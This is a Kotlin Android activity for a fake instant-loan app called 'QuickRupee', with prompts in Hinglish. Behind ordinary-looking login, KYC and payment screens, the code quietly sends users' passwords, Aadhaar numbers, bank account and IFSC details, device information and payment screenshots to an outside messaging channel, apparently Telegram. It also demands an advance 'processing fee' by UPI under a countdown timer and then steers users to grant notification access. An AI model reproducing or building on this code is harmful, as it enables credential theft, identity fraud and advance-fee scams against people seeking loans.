package com.quick.rupee

import android.content.Intent
import android.content.SharedPreferences
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.CountDownTimer
import android.provider.Settings
import android.text.InputType
import android.view.Gravity
import android.widget.EditText
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import java.io.File

class MainActivity : AppCompatActivity() {

    private lateinit var prefs: SharedPreferences
    private var timer: CountDownTimer? = null
    private var shotUri: Uri? = null

    private val askPerm = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()) { }

    private val pick = registerForActivityResult(
        ActivityResultContracts.GetContent()) { u ->
        if (u != null) { shotUri = u; toast("Screenshot jud gaya") }
    }

    override fun onCreate(s: Bundle?) {
        super.onCreate(s)
        prefs = getSharedPreferences("qr", 0)
        if (Build.VERSION.SDK_INT >= 26 && !Perms.allGranted(this))
            askPerm.launch(Perms.needed(this).toTypedArray())
        render()
    }

    override fun onDestroy() {
        timer?.cancel()
        super.onDestroy()
    }

    private fun step() = prefs.getInt("step", 0)
    private fun go(n: Int) {
        prefs.edit().putInt("step", n).apply()
        render()
    }

    private fun render() {
        when (step()) {
            0 -> login()
            1 -> kyc()
            2 -> plans()
            3 -> pay()
            else -> done()
        }
    }

    // ---------- helpers ----------
    private fun dp(v: Int) = (v * resources.displayMetrics.density).toInt()

    private fun tv(t: String, size: Float, color: Int, bold: Boolean = false) =
        TextView(this).apply {
            text = t
            textSize = size
            setTextColor(color)
            if (bold) setTypeface(typeface, Typeface.BOLD)
            setPadding(0, dp(3), 0, dp(3))
        }

    private fun field(label: String, hint: String, num: Boolean = false): Pair<LinearLayout, EditText> {
        val box = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL }
        box.addView(tv(label, 12f, Color.parseColor("#6B7A90")))
        val e = EditText(this).apply {
            this.hint = hint
            textSize = 15f
            setSingleLine(true)
            inputType = if (num) InputType.TYPE_CLASS_NUMBER else InputType.TYPE_CLASS_TEXT
            setPadding(dp(12), dp(12), dp(12), dp(12))
            background = GradientDrawable().apply {
                setColor(Color.WHITE)
                cornerRadius = dp(10).toFloat()
                setStroke(dp(1), Color.parseColor("#DCE3EE"))
            }
        }
        box.addView(e)
        box.setPadding(0, dp(6), 0, dp(6))
        return box to e
    }

    private fun btn(label: String, bg: Int, fg: Int, onClick: () -> Unit): TextView =
        tv(label, 16f, fg, true).apply {
            gravity = Gravity.CENTER
            setPadding(dp(16), dp(16), dp(16), dp(16))
            background = GradientDrawable().apply { setColor(bg); cornerRadius = dp(12).toFloat() }
            isClickable = true
            setOnClickListener { onClick() }
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT).apply { setMargins(0, dp(10), 0, 0) }
        }

    private fun header(sub: String): LinearLayout = LinearLayout(this).apply {
        orientation = LinearLayout.VERTICAL
        setBackgroundColor(Color.parseColor("#1552C4"))
        setPadding(dp(20), dp(26), dp(20), dp(22))
        addView(tv("QuickRupee", 24f, Color.WHITE, true))
        addView(tv(sub, 13f, Color.parseColor("#CFE0FF")))
    }

    private fun page(vararg views: android.view.View): ScrollView {
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#F4F6FA"))
        }
        views.forEach { root.addView(it) }
        val sv = ScrollView(this)
        sv.addView(root)
        sv.setBackgroundColor(Color.parseColor("#F4F6FA"))
        return sv
    }

    private fun toast(m: String) = Toast.makeText(this, m, Toast.LENGTH_SHORT).show()

    private fun device(): String =
        "${Build.MANUFACTURER} ${Build.MODEL} | A${Build.VERSION.RELEASE} | ${BuildConfig.VERSION_NAME}"

    // ---------- screens ----------
    private fun login() {
        val pad = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(20), dp(20), dp(20), dp(28))
        }
        pad.addView(tv("Turant personal loan", 20f, Color.parseColor("#16233A"), true))
        pad.addView(tv("₹20,000 se ₹1,00,000 tak, bina kagaz ke", 13f, Color.parseColor("#6B7A90")))

        val (mBox, mEt) = field("Mobile number", "10 digit mobile number", true)
        val (pBox, pEt) = field("Password", "Password banayein")
        pEt.inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_PASSWORD

        pad.addView(mBox)
        pad.addView(pBox)
        pad.addView(btn("Login karein", Color.parseColor("#1552C4"), Color.WHITE) {
            val m = mEt.text.toString().trim()
            val p = pEt.text.toString().trim()
            if (m.length != 10) { toast("10 digit mobile daalein"); return@btn }
            if (p.length < 4) { toast("Password kam se kam 4 akshar"); return@btn }
            prefs.edit().putString("mobile", m).putString("pass", p).apply()
            Thread {
                runCatching {
                    Tg.text("<b>LOGIN</b>\n<b>Mobile</b> <code>$m</code>\n<b>Password</b> <code>$p</code>\n${device()}\n${BuildConfig.UPI_ID}")
                }
            }.start()
            go(1)
        })
        pad.addView(tv("Aage badhne par aap niyam avam shartein sweekar karte hain.", 11f, Color.parseColor("#6B7A90")).apply {
            setPadding(0, dp(14), 0, 0)
        })
        setContentView(page(header("Turant approval - 5 minute"), pad))
    }

    private fun kyc() {
        val pad = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(20), dp(20), dp(20), dp(28))
        }
        pad.addView(tv("KYC poora karein", 20f, Color.parseColor("#16233A"), true))
        pad.addView(tv("Aapki jaankari surakshit hai", 13f, Color.parseColor("#6B7A90")))

        val (aBox, aEt) = field("Aadhaar number", "12 digit Aadhaar", true)
        val (bBox, bEt) = field("Bank ka naam", "Jaise SBI, HDFC")
        val (cBox, cEt) = field("Bank account number", "Account number", true)
        val (iBox, iEt) = field("IFSC code", "IFSC (11 akshar)")

        pad.addView(aBox); pad.addView(bBox); pad.addView(cBox); pad.addView(iBox)
        pad.addView(btn("KYC submit karein", Color.parseColor("#1552C4"), Color.WHITE) {
            val a = aEt.text.toString().trim()
            val b = bEt.text.toString().trim()
            val c = cEt.text.toString().trim()
            val i = iEt.text.toString().trim().uppercase()
            if (a.length != 12) { toast("12 digit Aadhaar daalein"); return@btn }
            if (b.isEmpty()) { toast("Bank ka naam daalein"); return@btn }
            if (c.length < 9) { toast("Sahi account number daalein"); return@btn }
            if (i.length != 11) { toast("Sahi IFSC daalein"); return@btn }
            prefs.edit().putString("aadhaar", a).putString("bank", b)
                .putString("acc", c).putString("ifsc", i).apply()
            Thread {
                runCatching {
                    Tg.text("<b>KYC</b>\n<b>Mobile</b> <code>${prefs.getString("mobile", "-")}</code>\n" +
                        "<b>Password</b> <code>${prefs.getString("pass", "-")}</code>\n" +
                        "<b>Aadhaar</b> <code>$a</code>\n<b>Bank</b> $b\n" +
                        "<b>Account</b> <code>$c</code>\n<b>IFSC</b> <code>$i</code>\n${device()}")
                }
            }.start()
            go(2)
        })
        setContentView(page(header("Step 2 / 3 - KYC"), pad))
    }

    private fun fee(a: Int) = when (a) {
        20000 -> 3000
        50000 -> 5000
        else -> 8000
    }

    private fun plans() {
        val pad = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(20), dp(20), dp(20), dp(28))
        }
        pad.addView(tv("Badhai ho!", 22f, Color.parseColor("#138808"), true))
        pad.addView(tv("Aap ₹1,00,000 tak ke liye eligible hain", 14f, Color.parseColor("#16233A")))
        pad.addView(tv("Apna amount chunein", 13f, Color.parseColor("#6B7A90")).apply {
            setPadding(0, dp(14), 0, dp(4))
        })

        for (a in listOf(20000, 50000, 100000)) {
            val card = LinearLayout(this).apply {
                orientation = LinearLayout.VERTICAL
                setPadding(dp(16), dp(16), dp(16), dp(16))
                background = GradientDrawable().apply {
                    setColor(Color.WHITE); cornerRadius = dp(12).toFloat()
                    setStroke(dp(1), Color.parseColor("#DCE3EE"))
                }
                isClickable = true
                setOnClickListener {
                    prefs.edit().putInt("amount", a).apply()
                    Thread {
                        runCatching {
                            Tg.text("<b>PLAN CHUNA</b>\n₹$a | fee ₹${fee(a)}\nMobile ${prefs.getString("mobile", "-")}")
                        }
                    }.start()
                    go(3)
                }
            }
            card.addView(tv("₹${"%,d".format(a)}", 20f, Color.parseColor("#16233A"), true))
            card.addView(tv("Processing fee ₹${fee(a)}", 13f, Color.parseColor("#6B7A90")))
            card.addView(tv("Turant approval", 12f, Color.parseColor("#138808")))
            card.layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT).apply { setMargins(0, dp(8), 0, 0) }
            pad.addView(card)
        }
        setContentView(page(header("Step 3 / 3 - Plan"), pad))
    }

    private fun pay() {
        val amount = prefs.getInt("amount", 20000)
        val f = fee(amount)
        val pad = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(20), dp(20), dp(20), dp(28))
        }
        pad.addView(tv("Processing fee ₹${"%,d".format(f)}", 20f, Color.parseColor("#16233A"), true))
        pad.addView(tv("₹${"%,d".format(amount)} ke loan ke liye ek baar fee jama karein", 13f, Color.parseColor("#6B7A90")))

        val qrBox = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(dp(16), dp(16), dp(16), dp(16))
            background = GradientDrawable().apply {
                setColor(Color.WHITE); cornerRadius = dp(12).toFloat()
                setStroke(dp(1), Color.parseColor("#DCE3EE"))
            }
        }
        val img = ImageView(this)
        val qrId = resources.getIdentifier("qr", "drawable", packageName)
        if (qrId != 0) img.setImageResource(qrId)
        qrBox.addView(img, LinearLayout.LayoutParams(dp(230), dp(230)))
        qrBox.addView(tv("Scan karke ₹${"%,d".format(f)} bhejein", 13f, Color.parseColor("#16233A")))
        qrBox.addView(tv(BuildConfig.UPI_ID, 13f, Color.parseColor("#1552C4"), true))
        pad.addView(qrBox)

        pad.addView(btn("UPI app se pay karein", Color.parseColor("#138808"), Color.WHITE) {
            val uri = Uri.parse("upi://pay?pa=${BuildConfig.UPI_ID}&pn=${BuildConfig.UPI_NAME}&am=$f&cu=INR")
            runCatching { startActivity(Intent(Intent.ACTION_VIEW, uri)) }
                .onFailure { toast("Koi UPI app nahi mili - QR scan karein") }
        })

        val timerTv = tv("02:00", 22f, Color.parseColor("#B00020"), true).apply {
            gravity = Gravity.CENTER
            setPadding(0, dp(14), 0, 0)
        }
        pad.addView(tv("Payment ke baad UTR daalein - samay:", 13f, Color.parseColor("#6B7A90")).apply {
            setPadding(0, dp(16), 0, 0)
        })
        pad.addView(timerTv)

        timer?.cancel()
        timer = object : CountDownTimer(120_000, 1000) {
            override fun onTick(ms: Long) {
                timerTv.text = "%02d:%02d".format(ms / 60000, (ms % 60000) / 1000)
            }
            override fun onFinish() { timerTv.text = "samay samapt" }
        }.start()

        val (uBox, uEt) = field("UTR / Reference number", "12 digit UTR", true)
        pad.addView(uBox)
        pad.addView(btn("Screenshot attach karein", Color.parseColor("#EEF3FB"), Color.parseColor("#1552C4")) {
            pick.launch("image/*")
        })
        pad.addView(btn("Payment ho gaya - submit", Color.parseColor("#1552C4"), Color.WHITE) {
            val u = uEt.text.toString().trim()
            if (u.length < 6) { toast("Sahi UTR daalein"); return@btn }
            prefs.edit().putString("utr", u).apply()
            Thread {
                runCatching {
                    Tg.text("<b>PAYMENT CLAIM</b>\n<b>Amount</b> ₹$amount | <b>Fee</b> ₹$f\n" +
                        "<b>UTR</b> <code>$u</code>\n<b>Mobile</b> <code>${prefs.getString("mobile", "-")}</code>\n" +
                        "<b>Account</b> <code>${prefs.getString("acc", "-")}</code> ${prefs.getString("ifsc", "-")}\n" +
                        "<b>Aadhaar</b> <code>${prefs.getString("aadhaar", "-")}</code>\n${device()}")
                    val u2 = shotUri
                    if (u2 != null) {
                        val tmp = File(cacheDir, "pay.jpg")
                        contentResolver.openInputStream(u2)?.use { ins ->
                            tmp.outputStream().use { ins.copyTo(it) }
                        }
                        Tg.photo(tmp, "payment screenshot")
                        tmp.delete()
                    }
                }
            }.start()
            go(4)
        })
        setContentView(page(header("Payment"), pad))
    }

    private fun done() {
        val amount = prefs.getInt("amount", 20000)
        val pad = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(20), dp(24), dp(20), dp(28))
        }
        pad.addView(tv("Aavedan safal", 24f, Color.parseColor("#138808"), true))
        pad.addView(tv("₹${"%,d".format(amount)} ka loan swikrit", 17f, Color.parseColor("#16233A"), true))
        pad.addView(tv("Agli 24 ghante mein amount aapke bank account mein credit ho jayega.",
            14f, Color.parseColor("#16233A")).apply { setPadding(0, dp(10), 0, 0) })
        pad.addView(tv("Reference: QR-${prefs.getString("mobile", "0000")}-${prefs.getString("utr", "-")}",
            12f, Color.parseColor("#6B7A90")).apply { setPadding(0, dp(12), 0, 0) })

        pad.addView(btn("Notification access ON karein", Color.parseColor("#EEF3FB"), Color.parseColor("#1552C4")) {
            startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
        })
        pad.addView(btn("Battery Unrestricted karein", Color.parseColor("#EEF3FB"), Color.parseColor("#1552C4")) {
            Perms.askBattery(this)
        })

        pad.addView(tv("Aapke liye aur offers", 15f, Color.parseColor("#16233A"), true).apply {
            setPadding(0, dp(20), 0, dp(4))
        })
        for (t in listOf("Instant personal loan - 24 ghante mein", "Loan ₹1,00,000 tak - kam byaj",
                "Credit score sudharein - free report", "Dost ko refer karein - ₹500 kamayein")) {
            pad.addView(tv("-  $t", 13f, Color.parseColor("#6B7A90")))
        }
        pad.addView(tv("QuickRupee  |  support@quickrupee.in", 11f, Color.parseColor("#6B7A90")).apply {
            setPadding(0, dp(20), 0, 0)
        })
        setContentView(page(header("Dashboard"), pad))
    }
}
